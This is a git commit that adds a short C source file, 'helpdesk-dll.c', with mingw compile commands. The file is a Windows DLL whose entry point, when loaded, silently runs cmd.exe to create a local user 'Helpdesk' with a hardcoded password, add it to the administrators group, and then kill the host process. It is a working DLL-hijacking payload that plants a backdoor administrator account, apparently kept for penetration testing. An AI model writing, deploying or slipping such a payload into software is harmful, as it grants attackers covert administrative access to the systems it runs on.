e044224c73109709935b7671d7844ca3ef14d641
Craneo7 <143763984+Craneo7@users.noreply.github.com>
2024-10-07 13:29:28 +0200

    Add files via upload

---
+++ helpdesk-dll.c
@@ -0,0 +1,12 @@
+// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /c net user /add Helpdesk L3tm3!n && net localgroup administrators Helpdesk /add");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
